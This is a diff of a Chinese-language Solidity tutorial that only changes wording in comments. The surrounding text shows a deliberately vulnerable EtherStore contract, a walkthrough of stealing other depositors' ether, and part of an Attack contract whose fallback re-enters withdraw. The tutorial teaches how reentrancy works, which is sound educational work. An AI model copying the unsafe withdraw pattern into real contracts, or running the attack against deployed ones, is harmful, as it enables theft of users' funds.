@@ -9,19 +9,19 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.17;
 contract EtherStore {
-    //mapping类型的变量balances，它将用户地址映射到其在合约中的以太币余额。
+    //mapping类型的变量balances，它将用户地址映射到其在合约中的以太余额。
     mapping(address => uint) public balances;
 
-    //deposit的函数，它允许用户将以太币存入合约。
-    //使用msg.sender来确定调用者的地址，并将msg.value中的以太币数量添加到该地址的余额中。
+    //deposit的函数，它允许用户将以太存入合约。
+    //使用msg.sender来确定调用者的地址，并将msg.value中的以太数量添加到该地址的余额中。
     function deposit() public payable {
         balances[msg.sender] += msg.value;
     }
 
     /*
-    withdraw的函数，它允许用户从合约中提取他们的以太币余额。
+    withdraw的函数，它允许用户从合约中提取他们的以太余额。
     它首先检查调用者的余额是否大于零，如果不是，则函数会抛出异常。
-    然后它使用msg.sender.call来将以太币发送回调用者的地址。
+    然后它使用msg.sender.call来将以太发送回调用者的地址。
     如果发送失败，则函数会抛出异常。
     最后，它将调用者的余额设置为零，以确保他们无法多次提取相同的余额。
     */
@@ -45,10 +45,10 @@ contract EtherStore {
 EtherStore是一个合约，您可以存入和取出ETH。该合约容易受到可重入攻击的威胁。让我们来看看为什么。
 
 1. 部署EtherStore
-2. 从账户1（Alice）和账户2（Bob）各存入1个以太币到EtherStore
+2. 从账户1（Alice）和账户2（Bob）各存入1个以太到EtherStore
 3. 部署攻击合约并指定EtherStore的地址
-4. 使用账户3（Eve）调用Attack.attack函数并发送1个以太币。
-   你将会得到3个以太币（其中2个以太币是从Alice和Bob那里被盗取的，另外1个以太币是从这个合约发送的）。
+4. 使用账户3（Eve）调用Attack.attack函数并发送1个以太。
+   你将会得到3个以太（其中2个以太是从Alice和Bob那里被盗取的，另外1个以太是从这个合约发送的）。
 
 发生了什么？
 攻击者能够在EtherStore.withdraw执行完成之前多次调用EtherStore.withdraw。
@@ -72,15 +72,15 @@ contract Attack {
         etherStore = EtherStore(_etherStoreAddress);
     }
 
-    // 当EtherStore向此合约发送以太币时，将调用Fallback函数。
+    // 当EtherStore向此合约发送以太时，将调用Fallback函数。
     fallback() external payable {
         if (address(etherStore).balance >= 1 ether) {
             etherStore.withdraw();
         }
     }
     
-    //攻击函数，要求发送至少1 ether的以太币。
-    //将1 ether的以太币存入etherStore合约中，然后立即调用etherStore的withdraw()函数以取回所有以太币。
+    //攻击函数，要求发送至少1 ether的以太。
+    //将1 ether的以太存入etherStore合约中，然后立即调用etherStore的withdraw()函数以取回所有以太。
     function attack() external payable {
         require(msg.value >= 1 ether);
         etherStore.deposit{value: 1 ether}();
